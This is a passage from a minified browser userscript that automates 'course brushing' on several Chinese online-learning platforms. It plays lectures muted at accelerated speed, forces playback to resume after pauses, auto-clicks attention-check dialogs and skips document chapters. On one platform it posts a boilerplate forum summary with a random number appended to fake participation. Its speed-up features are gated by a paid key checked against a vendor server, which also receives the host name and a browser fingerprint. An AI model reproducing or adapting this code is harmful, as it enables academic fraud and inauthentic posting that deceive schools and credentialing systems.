            }, 3e3), this.listenRebort(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            })), 2 == e && (showTip("✅✅✅\u68c0\u6d4b\u5230\u8be5\u7ae0\u8282\u4e0d\u662f\u89c6\u9891，\u5373\u5c06\u5207\u6362\u4e0b\u4e00\u8282", 2e3), await sleep(2e3), this.playNext())
        }

        updateSpeedElement(e) {
            localStorage.setItem("_localSpeed", e.toString()), ElementObj.$video.playbackRate = e
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                let e = document.querySelector(".layui-layer-btn0");
                e && setTimeout(() => {
                    e.click(), ElementObj.$video.play()
                }, 3e3)
            }, 1e4)
        }

        playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c") : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), showTip("🔉\u6b63\u5728\u5207\u6362\u8bfe\u7a0b"), setTimeout(() => {
                this._o1()
            }, 5e3))
        }
    }

    shandongzhuanyejisu.ctxid = 26;

    class zhijiaoyun2 extends Main {
        constructor() {
            super(), this.taskLength = 0, this.topIndex = 0, this.parentIndex = -1, this.currentIndex = -1, this.videoplaying = -1, this.authorization = null, this.classList = [], this.selectData = [], this.timer = null, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                if ("/study/coursePreview/spoccourseIndex/courseware" === location.pathname && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", this._o1()), "/study/coursePreview/spoccourseIndex" === location.pathname && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", await this.getCurrentIndex()), "/study/studentFast/classroomNow" === location.pathname && (ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$allTask = document.querySelectorAll(".active_list"), ElementObj.$allTask.length)) {
                    clearInterval(t);
                    for (var e of ElementObj.$allTask) if ("100%" !== e.querySelectorAll(".left div")[4].innerText.replace("\u5b66\u4e60\u8fdb\u5ea6：", "").trim()) {
                        e.querySelector(".b").click(), await sleep(2e3), this._o1();
                        break
                    }
                }
                "/study/studentFast/courseware" === location.pathname && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", this._o1())
            }, 1e3)
        }

        async getCurrentIndex() {
            let r = setInterval(async () => {
                ElementObj.$allTask = document.querySelectorAll(".listItem");
                e:if (ElementObj.$allTask.length) {
                    clearInterval(r);
                    let e = !1;
                    for (var t of ElementObj.$allTask) {
                        t.querySelector(".el-progress-bar__inner").style.width;
                        e = !0, t.click(), await sleep(1700);
                        var l, n = t.querySelectorAll(".items.iChild");
                        for (l of n) l.click();
                        await sleep(1200);
                        var a = t.querySelectorAll(".fItem").length ? t.querySelectorAll(".fItem") : t.querySelectorAll(".fIteml");
                        for (let e = 0; e < a.length; e++) {
                            var i = a[e];
                            if (-1 === i.innerText.indexOf(".mp3")) {
                                var o = /[0-9]+/.exec(i.nextElementSibling.innerText)[0];
                                if (Number(o) < 98) {
                                    setTimeout(() => {
                                        location.reload()
                                    }, 2e3), i.click();
                                    break e
                                }
                            }
                        }
                    }
                    e || (location.href = "https://zjy2.icve.com.cn/study/course")
                }
            }, 2e3)
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 7, l = setInterval(() => {
                    t < 0 && (clearInterval(l), e(2)), ElementObj.$video = document.querySelector("video") || document.querySelector("audio"), ElementObj.$video ? (clearInterval(l), e(1)) : document.querySelectorAll(".el-carousel__item").length ? (clearInterval(l), e(2)) : --t
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.timer);
            var e = await this.getVideoDom();
            if (document.querySelector(".el-message-box__btns button.el-button--primary")?.click(), 1 == e && (await this.changeHtml(ElementObj.$video.parentElement), ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 2500), this.listenVidoeStatus(), ElementObj.$video.addEventListener("ended", async () => {
                await this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 3e3)
            })), 2 == e) {
                showTip("🔊🔊🔊\u5373\u5c06\u5f00\u59cb\u64ad\u653e\u6587\u6863");
                var t, e = document.querySelectorAll(".el-carousel__item"), l = document.querySelector(".page>.next");
                for (t of e) l.click(), await sleep(500);
                showTip("🎉🎉🎉🎉🎉🎉\u6587\u6863\u64ad\u653e\u5b8c\u6210🎉🎉🎉🎉🎉🎉"), await this.playNext()
            }
        }

        async playNext() {
            if ("/study/studentFast/courseware" === location.pathname) document.querySelector(".locationFast .r").click(), await sleep(2e3), location.reload(); else {
                var e = document.querySelector(".next>a");
                if ("\u6682\u65e0" == e?.innerText) return setTimeout(() => {
                    location.reload()
                }, 2e3), void document.querySelector(".location .r").click();
                await sleep(300), e?.click()
            }
            setTimeout(() => {
                this._o1()
            }, 2500)
        }

        listenVidoeStatus() {
            let e = 0;
            this.timer = setInterval(() => {
                ElementObj.$video = document.querySelector("video"), ElementObj.$video && (this.addInfo(`🔉🔉🔉\u5df2\u6210\u529f\u76d1\u6d4b${e}\u6b21，\u7a0b\u5e8f\u540e\u53f0\u4ee5${toolOption.accelerator}\u500d\u901f\u6b63\u5e38\u5b66\u4e60\u4e2d，\u5df2\u64ad\u653e【${ElementObj.$video.currentTime.toFixed(1)}】\u79d2`), e += 1)
            }, 3e3)
        }

        render(t) {
            var l = 1 == t ? this.classList : this.selectData;
            let n = "";
            for (let e = 0; e < l.length; e++) {
                var a = l[e];
                n += `
                <div class="item">
                    <div class="content">
                        <div class="name1">${a.courseInfoName}</div>
                        <div class="name2">\u73ed\u7ea7：${a.className}</div>
                        <div class="name2">\u5b66\u671f：${a.termName}</div>
                        <div class="name2">\u5b8c\u6210\u8fdb\u5ea6：${a.studySpeed}%</div>
                    </div>
                    <div class="item-controls">
                        <button style='background: ${1 == t ? "#409eff" : "red"}'>${1 == t ? "\u9009\u62e9" : "\u79fb\u9664"}</button>
                    </div>
                </div>
                `
            }
            var i = 1 == t ? document.querySelector(".leftPannel") : document.querySelector(".rightPannel");
            i.innerHTML = n;
            for (let e = 0; e < i.children.length; e++) i.children[e].querySelector("button").onclick = () => {
                1 == t ? this.moveDataToSelectData(e) : this.moveDataToClassList(e)
            }
        }

        moveDataToSelectData(e) {
            this.selectData.push(this.classList[e]), this.classList.splice(e, 1), this.handleTemplekeyData(), this.render(1), this.render(2)
        }

        moveDataToClassList(e) {
            this.classList.push(this.selectData[e]), this.selectData.splice(e, 1), this.handleTemplekeyData(), this.render(1), this.render(2)
        }

        handleTemplekeyData() {
            MyTool.setValue("selectData", this.selectData)
        }
    }

    class chongqingzhuanye extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let a = setInterval(async () => {
                try {
                    var e, t, l, n;
                    ElementObj.$parentNodes = document.querySelectorAll(".course__list--content .course__item"), ElementObj.$parentNodes.length ? (clearInterval(a), this.getParentIndex()) : document.querySelector(".btn-next") && "/nms-frontend/index.html" == location.pathname ? (clearInterval(a), MyTool.setValue("homeUrl", location.href), this.getParentIndex2()) : (ElementObj.$allTask = document.querySelectorAll("ul li ul li .posCatalog_select"), ElementObj.$allTask.length && (clearInterval(a), this.getCurrentIndex()), (e = document.querySelector("#iframe_aliplayer")) ? (clearInterval(a), ElementObj.$video = e?.contentDocument?.querySelector("video"), this.handleClickSpeedUp2()) : (t = document.querySelector("#aliPlayerFrame")) && (ElementObj.$allTask = t.contentDocument?.querySelectorAll(".section .section-item"), ElementObj.$allTask.length) ? (clearInterval(a), this.getCurrentIndex2()) : (l = document.querySelectorAll(".complete-status .btn-item")[2]) && (clearInterval(a), l.click(), await sleep(1500), 0 === (n = document.querySelectorAll("#pane-MUST .text-item")).length ? alert("\u5168\u90e8\u516c\u9700\u8bfe\u5df2\u5b66\u5b8c") : (MyTool.setValue("homeUrl", location.href), n[0].click(), setTimeout(() => {
                        window.close()
                    }, 2e4))))
                } catch (e) {
                }
            }, 1e3)
        }

        getParentIndex() {
            ElementObj.$parentNodes.forEach(e => {
                var t = e.querySelector("span.num");
                t && parseInt(t.innerText) <= 95 && (e.querySelector(".enter-btn").click(), setTimeout(() => {
                    location.reload()
                }, 3e3))
            })
        }

        async getParentIndex2() {
            document.querySelectorAll(".btn-box .btn-item")[2].click(), await sleep(3500), document.querySelectorAll("#pane-MUST .text-item")[0].click()
        }

        async getCurrentIndex() {
            showTip("✅✅✅\u6b63\u5728\u521d\u59cb\u5316"), ElementObj.$handleSpeedUp.style.display = "none";
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (!ElementObj.$allTask[e].querySelector(".icon_Completed")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c") : (ElementObj.$allTask[this.currentIndex].querySelector(".posCatalog_name").click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), this._o1())
        }

        async getCurrentIndex2() {
            showTip("✅✅✅\u6b63\u5728\u521d\u59cb\u5316"), ElementObj.$handleSpeedUp.style.display = "none";
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (!ElementObj.$allTask[e].classList.contains("finish")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex && (location.href = MyTool.getValue("homeUrl")), ElementObj.$allTask[e].click(), showTip("✅✅✅\u5b8c\u6210\u521d\u59cb\u5316，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), setTimeout(() => {
                this.handleClickSpeedUp2(() => {
                }, 3)
            }, 4500)
        }

        getVideoDom(e) {
            return new Promise(n => {
                if (e) {
                    let t = 0, l = setInterval(() => {
                        var e = document.querySelector("#aliPlayerFrame").contentDocument;
                        ElementObj.$video = e.querySelector("video"), t += 1, ElementObj.$video && (clearInterval(l), n(!0)), 10 < t && (clearInterval(l), n(!1))
                    }, 1e3)
                } else {
                    let t = 0, l = setInterval(() => {
                        var e = document.querySelector("#iframe").contentDocument?.querySelector("iframe")?.contentDocument;
                        ElementObj.$video = e.querySelector("video"), t += 1, ElementObj.$video && (clearInterval(l), n(!0)), 10 < t && (clearInterval(l), n(!1))
                    }, 1e3)
                }
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), clearInterval(this.timer);
            var e, t = await this.getVideoDom();
            t && (ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), e = $el("#iframe").contentDocument.querySelector("iframe")?.contentDocument.querySelector("#reader"), this.changeHtml(e), this.listenPageHide(), this.listenPlayTime(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            })), t || (showTip("⚠️⚠️⚠️\u672a\u68c0\u6d4b\u5230\u89c6\u9891，5\u79d2\u540e\u5207\u6362\u4e0b\u4e00\u8282", 4500), setTimeout(() => {
                this.playNext()
            }, 3e3))
        }

        async play2() {
            ElementObj.$video ? (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), ElementObj.$video.addEventListener("ended", async () => {
                var e = MyTool.getValue("homeUrl");
                await sleep(2500), MyTool.openInTab(e), setTimeout(() => {
                    window.close()
                }, 5e3)
            })) : location.reload()
        }

        async play3() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), clearInterval(this.timer);
            await this.getVideoDom("#aliPlayerFrame");
            ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), ElementObj.$video.addEventListener("ended", async () => {
                var e;
                this.currentIndex >= ElementObj.$allTask.length - 1 ? (e = MyTool.getValue("homeUrl"), await sleep(2500), MyTool.openInTab(e), setTimeout(() => {
                    window.close()
                }, 15e3)) : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), showTip("⚠️⚠️⚠️\u6b63\u5728\u5207\u6362\u8bfe\u7a0b", 4500), setTimeout(() => {
                    this.handleClickSpeedUp2(() => {
                    }, 3)
                }, 4500))
            }), ElementObj.$video.addEventListener("pause", () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebortTime = setInterval(() => {
                var e = document.querySelector("iframe")?.contentDocument?.querySelector(".next-button");
                e && e.click()
            }, 13e3)
        }

        async playNext() {
            await sleep(3e3), this.currentIndex >= ElementObj.$allTask.length - 1 ? location.href = MyTool.getValue("homeUrl") : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].querySelector(".posCatalog_name").click(), showTip("⚠️⚠️⚠️\u6b63\u5728\u5207\u6362\u8bfe\u7a0b", 4500), setTimeout(() => {
                this._o1()
            }, 5e3))
        }

        listenPlayTime() {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let l = 0;
            this.timer = setInterval(() => {
                l += 1;
                var e = (ElementObj.$video.currentTime / 60).toFixed(2),
                    t = (ElementObj.$video.duration / 60).toFixed(2);
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t}\u5206\u949f`), "\u4efb\u52a1\u70b9\u5df2\u5b8c\u6210" == (document.querySelector("#iframe").contentDocument?.querySelector(".ans-job-icon"))?.getAttribute("aria-label") && (clearInterval(this.timer), this.addInfo("✅✅✅\u76d1\u6d4b\u5230\u5f53\u524d\u4efb\u52a1\u5df2\u5b8c\u6210，5\u79d2\u540e\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u8282", 1), setTimeout(() => {
                    this.playNext()
                }, 3e3))
            }, 3e3)
        }

        addInfo(e, t) {
            ElementObj.$ctxstatsbox = $el("#iframe").contentDocument.querySelector("iframe")?.contentDocument.querySelector(".ctxstatsbox");
            15 <= ($el("#iframe").contentDocument.querySelector("iframe")?.contentDocument.querySelectorAll(".ctxstatsbox_li")).length && (ElementObj.$ctxstatsbox.innerHTML = "");
            t = `<li class="ctxstatsbox_li" style="color: ${0 == t ? "#f01414" : "#000"};line-height: 30px;font-size: 16px;list-style: none;">${e}</li>`;
            ElementObj.$ctxstatsbox.innerHTML += t
        }

        async handleClickSpeedUp2(e, t) {
            var l = localStorage.getItem("mytoolkey");
            l ? (this.speedStatus = 1, 200 == (l = await axfedata({
                method: "GET",
                url: _b + (`/speedup?toolkey=${l}&t=2&canuse=${toolOption.SchoolType}&h=${location.host}&fingerprint=${this.fingerprint}&v=` + version)
            })).code ? (this.speedStatus = 1, 3 == t ? this.play3() : this.play2()) : showTip("🔉🔉🔉" + l.message, 5e3, !0)) : (alert("\u8bf7\u5148\u8d2d\u4e70key"), window.open(_bt))
        }
    }

    chongqingzhuanye.ctxid = 26;

    class zaixianxuexi extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                try {
                    var e = document.querySelector("#jAlertButton2");
                    e ? (clearInterval(t), e.click(), await sleep(2e3), ElementObj.$handleSpeedUp.style.display = "none", this._o1()) : (ElementObj.$allTask = document.querySelectorAll(".videoList li"), ElementObj.$allTask.length && (clearInterval(t), this.getCurrentIndex()))
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            showTip("\u6b63\u5728\u521d\u59cb\u5316"), ElementObj.$handleSpeedUp.style.display = "none";
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if ("【\u5df2\u5b8c\u6210】" != ElementObj.$allTask[e].querySelector(".overTitle").innerText) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c") : (ElementObj.$allTask[this.currentIndex]?.click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), this._o1())
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), e(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), await this.getVideoDom(), ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                this.getCurrentIndex()
            }), ElementObj.$video.addEventListener("pause", () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            })
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
            }, 1e4)
        }
    }

    zaixianxuexi.ctxid = 26;

    class guojiakaifangdaxue extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    "xczxzdbf.moodle.qwbx.ouchn.cn" == location.host && (ElementObj.$allTask = document.querySelectorAll("li[id]"), ElementObj.$allTask.length) ? (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", this.getCurrentIndex()) : "xczxzdbf-moodle.qwbx.ouc-online.com.cn" == location.host && (ElementObj.$allTask = document.querySelectorAll(".activity[id]"), ElementObj.$allTask.length) ? (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", this.getCurrentIndex()) : (document.querySelector("button.next-btn") || document.querySelector(".newgk-prenext.newgk-next")) && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), showTip("♥♥♥\u521d\u59cb\u5316\u5b8c\u6210"), this.pdPlayFn(location.href))
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("current")) {
                this.currentIndex = e;
                break
            }
            showTip("♥♥♥\u521d\u59cb\u5316\u5b8c\u6210"), this.pdPlayFn(location.href)
        }

        getVideoDom() {
            return new Promise(t => {
                let l = 0, n = setInterval(() => {
                    var e;
                    l += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video || (e = document.querySelector("#previewContentInIframe"), ElementObj.$video = e?.contentDocument?.querySelector("video"), ElementObj.$video) ? (clearInterval(n), t(1)) : document.querySelector(".forum-toolbar-search button") ? t(3) : 7 <= l && (clearInterval(n), t(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e, t = await this.getVideoDom();
            1 == t && (ElementObj.$video.volume = 0, await sleep(200), (e = document.querySelector(".mvp-toggle-play")) ? e.click() : ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), ElementObj.$video.addEventListener("ended", async () => {
                showTip("\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), await sleep(4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    var e = document.querySelector(".mvp-toggle-play");
                    ElementObj.$video.volume = 0, e?.click(), ElementObj.$video.play()
                }, 1500)
            })), 2 == t && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), document.querySelector("a.ng-scope")?.click(), await sleep(1e3), document.querySelector("#file-previewer .header a.right.close")?.click(), await sleep(2e3), this.playNext()), 3 == t && (showTip("\u6b63\u5728\u65b0\u95fb\u8ba8\u8bba\u533a\u7684Id"), showTip(`✅✅✅\u8ba8\u8bba\u533aid\u83b7\u53d6\u6210\u529f，<span style="color: #f01414;">${(e = await this.getTopicID(location.hash.replace("#/", ""))).topic_category.id}</span>`), showTip("🔉🔉🔉\u6b63\u5728\u53d1\u5e16\u4e2d，\u9884\u8ba12-9\u79d2\u5b8c\u6210"), t = {
                category_id: e.topic_category.id,
                content: `<p>\u6536\u83b7\u5f88\u5927，\u7ee7\u7eed\u5b66\u4e60，\u671f\u5f85\u540e\u9762\u7684\u8bfe\u7a0b,+${Math.trunc(10 * Math.random())}</p>`,
                title: "\u603b\u7ed3",
                uploads: []
            }, await this.sendTopic(t), showTip("✅✅✅\u5e16\u5b50\u53d1\u5e03\u6210\u529f，\u5373\u5c06\u81ea\u52a8\u64ad\u653e\u4e0b\u4e00\u4e2a"), await MyTool.sleep(2e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
            }, 1e4)
        }

        playNext() {
            this.currentIndex += 1;
            let e = document.querySelector("button.next-btn");
            ["xczxzdbf-moodle.qwbx.ouc-online.com.cn", "xczxzdbf.moodle.qwbx.ouchn.cn"].includes(location.host) ? (e = ElementObj.$allTask[this.currentIndex].querySelector(".aalink"), this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (e?.click(), setTimeout(() => {
                this.pdPlayFn(location.href)
            }, 5e3))) : "moodle.syxy.ouchn.cn" == location.host ? (e = document.querySelector(".newgk-prenext.newgk-next")) && (e.click(), setTimeout(() => {
                this.pdPlayFn(location.href)
            }, 5e3)) : (e = document.querySelector("button.next-btn")) && (e.click(), setTimeout(() => {
                this.pdPlayFn(location.href)
            }, 5e3))
        }

        getTopicID(t) {
            return new Promise(async e => {
                e(await MyTool.axfedata({
                    url: location.origin + `/api/forum/${t}/category?fields=id,title,activity(id,sort,module_id,syllabus_id,start_time,end_time,is_started,is_closed,data,can_show_score,score_percentage,title,prerequisites,submit_by_group,group_set_id,group_set_name,imported_from,parent_id),referrer_type`,
                    method: "GET"
                }))
            })
        }

        sendTopic(e) {
            return new Promise(async t => {
                fetch(location.origin + "/api/topics", {
                    headers: {
                        accept: "application/json, text/plain, */*",
                        "accept-language": "zh-CN,zh;q=0.9",
                        "content-type": "application/json;charset=UTF-8",
                        "sec-ch-ua": '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin"
                    },
                    referrer: `${location.origin}/${e.category_id}/learning-activity/full-screen`,
                    referrerPolicy: "strict-origin-when-cross-origin",
                    body: JSON.stringify(e),
                    method: "POST",
                    mode: "cors",
                    credentials: "include"
                }).then(e => e.json()).then(e => {
                    t(e)
                })
            })
        }
    }

    guojiakaifangdaxue.ctxid = 26;

    class jjjxjy extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            if ("hunau.web2.superchutou.com" == location.host) {
                let t = setInterval(() => {
                    var e;
                    ElementObj.$handleSpeedUp.style.display = "none", "https://hunau.web2.superchutou.com/#/" == location.href && (clearInterval(t), setTimeout(() => {
                        this._init()
                    }, 5e3), location.href = MyTool.getValue("homeUrl")), -1 != location.href.indexOf("/#/onlineclass/curriculum") && (e = document.querySelector(".ant-row.catalog_child_line")) && (clearInterval(t), MyTool.setValue("homeUrl", location.href), setTimeout(() => {
                        this._init()
                    }, 5e3), e.click()), ElementObj.$allTask = document.querySelectorAll(".ant-list-items div a"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), this.getCurrentIndex())
                }, 1e3)
            } else {
                window.addEventListener("urlchange", e => {
                    setTimeout(() => {
                        ElementObj.$allTask = document.querySelectorAll(".ant-list-items div a"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), this.getCurrentIndex());
                        var e = document.querySelector(".ant-row.catalog_child_line");
                        e && (clearInterval(t), e?.click()), "https://jjxy.web2.superchutou.com/#/" == location.href && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), this.getParentIndex())
                    }, 5e3)
                });
                let t = setInterval(async () => {
                    try {
                        ElementObj.$allTask = document.querySelectorAll(".ant-list-items div a"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), this.getCurrentIndex());
                        var e = document.querySelector(".ant-row.catalog_child_line");
                        e && (clearInterval(t), setTimeout(() => {
                            this._init()
                        }, 5e3), e?.click()), "https://jjxy.web2.superchutou.com/#/" == location.href && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), this.getParentIndex())
                    } catch (e) {
                    }
                }, 1e3)
            }
        }

        getParentIndex() {
            for (var e = $el(".ant-table-tbody").querySelectorAll(".ant-table-tbody tr"), t = 0; t <= e.length - 1; t++) {
                var l = e[t].querySelector(".ant-progress-bg");
                if (parseInt(l.style.width) < 99) {
                    setTimeout(() => {
                        this._init()
                    }, 5e3), e[t].querySelector(".anticon-play-circle").click();
                    break
                }
            }
        }

        async getCurrentIndex() {
            let e = -1;
            for (var t = 0; t <= ElementObj.$allTask.length - 1; t++) if (ElementObj.$allTask[t].classList.contains("catalog_playing___3PDRN")) {
                e = t;
                break
            }
            for (t = 0; t <= ElementObj.$allTask.length - 1; t++) if (!ElementObj.$allTask[t].querySelector("i.anticon-check-circle")) {
                this.currentIndex = t;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (e != this.currentIndex && ElementObj.$allTask[this.currentIndex].click(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this.pdPlayFn(location.href)
            }, 4e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.timer2), clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e, t = await this.getVideoDom();
            1 == t && (ElementObj.$video.volume = 0, await sleep(200), (e = document.querySelector(".mvp-toggle-play")) ? e.click() : ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == t && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".ant-modal-body button"),
                    t = document.querySelector(".ant-btn.ant-btn-primary");
                e?.click(), t?.click()
            }, 1e3)
        }

        async playNext() {
            var e;
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(4500), this.currentIndex += 1, (e = ElementObj.$allTask[this.currentIndex]) && (e.click(), setTimeout(() => {
                this._o1()
            }, 4e3)))
        }
    }

    jjjxjy.ctxid = 26;

    class zhuzhouteacher extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                try {
                    var e = document.querySelectorAll(".antd-pro-pages-my-center-my-center-menuItem")[2];
                    e ? (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), e.click(), await sleep(1e3), this.getCurrentIndex()) : (ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", this._o1()))
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            await sleep(2500), ElementObj.$allTask = document.querySelectorAll(".antd-pro-pages-my-center-course-learning-courseWrap>.ant-row");
            for (var e, t = 0; t <= ElementObj.$allTask.length - 1; t++) {
                var l = ElementObj.$allTask[t].querySelector(".ant-progress-text").innerHTML;
                if (parseInt(l) < 99) {
                    this.currentIndex = t;
                    break
                }
            }
            -1 != this.currentIndex ? (ElementObj.$allTask[this.currentIndex].querySelector(".ant-btn.ant-btn-primary").click(), setTimeout(() => {
            }, 15e3)) : (e = document.querySelector(".ant-pagination-next")).classList.contains("ant-pagination-disabled") ? alert("\u5168\u90e8\u8bfe\u7a0b\u5df2\u5b66\u5b8c") : (e.click(), this.getCurrentIndex())
        }

        async play() {
